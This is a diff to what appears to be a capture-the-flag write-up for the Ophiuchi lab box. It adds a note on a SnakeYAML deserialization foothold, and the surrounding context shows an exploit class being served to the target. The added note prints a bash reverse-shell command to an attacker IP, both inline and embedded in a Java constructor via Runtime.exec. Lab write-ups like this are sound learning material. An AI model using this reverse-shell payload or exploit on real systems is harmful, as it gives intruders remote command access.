@@ -15,6 +15,7 @@
   - [SnakeYAML Library](#snakeyaml-library)
   - [SnakeYAML Deserialization Vulnerability](#snakeyaml-deserialization-vulnerability)
   - [Getting Initial Foothold](#getting-initial-foothold)
+  - [Note on Initial Foothold](#note-on-initial-foothold)
 - User
 - Root
 
@@ -205,3 +206,20 @@ Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 10.10.10.227 - - [05/Jul/2021 22:08:17] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
 10.10.10.227 - - [05/Jul/2021 22:08:17] "GET /script HTTP/1.1" 200 -
 ```
+
+### Note on Initial Foothold
+
+You might be wondering why we can't simply execute "bash -i >& /dev/tcp/10.10.14.59/4444 0>&1" in the constructor, i.e.
+
+```java
+public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("bash -i >& /dev/tcp/10.10.14.59/4444 0>&1");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+```
+
+I find the following post in the [discussion forum](https://forum.hackthebox.eu/discussion/4361/official-ophiuchi-discussion) for the Ophiuchi box.
+![discussion](images/7.png)
